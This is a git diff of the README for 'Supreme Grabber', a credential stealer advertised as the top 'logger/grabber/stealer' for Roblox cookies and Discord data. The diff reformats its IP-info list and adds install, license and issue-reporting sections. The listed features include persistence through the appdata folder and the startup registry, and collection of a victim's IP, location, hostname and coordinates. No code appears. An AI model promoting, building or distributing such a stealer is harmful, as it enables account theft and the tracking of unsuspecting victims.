@@ -1,4 +1,4 @@
-# Supreme Grabber
+the # Supreme Grabber
 Currently the #1 logger/grabber/stealer in multiple top developers opinions if you are looking for both Roblox Cookie & Discord e.t.c grabber, dualhook free. Many features included and easy to use!
 # Features
 ## Discord
@@ -61,11 +61,18 @@ Currently the #1 logger/grabber/stealer in multiple top developers opinions if y
     * Place stub in appdata
     * Add to startup registry
 ## IP INFO
-PROVIDES IP 🌐
-PROVIDES CITY 🏙
-PROVIDES COUNTRY 🌎
-PROVIDES HOSTNAME 🌐
-PROVIDES REGION 🗺
-PROVIDES ORG 🏗
-PROVIDES LONG & LAT 🌐
-PROVIDES TIMEZONE ⏰
+* PROVIDES IP 🌐
+* PROVIDES CITY 🏙
+* PROVIDES COUNTRY 🌎
+* PROVIDES HOSTNAME 🌐
+* PROVIDES REGION 🗺
+* PROVIDES ORG 🏗
+* PROVIDES LONG & LAT 🌐
+* PROVIDES TIMEZONE ⏰
+# Install
+# Contributing
+# License
+Supreme Grabber is Licensed under the [MIT License](https://mit-license.org/)
+# Errors?
+* Make an [issue](https://github.com/real-fbdn/Supreme-Grabber/issues)
+* Join the <discord> In the middle of polishing the server, as such temporarily down.
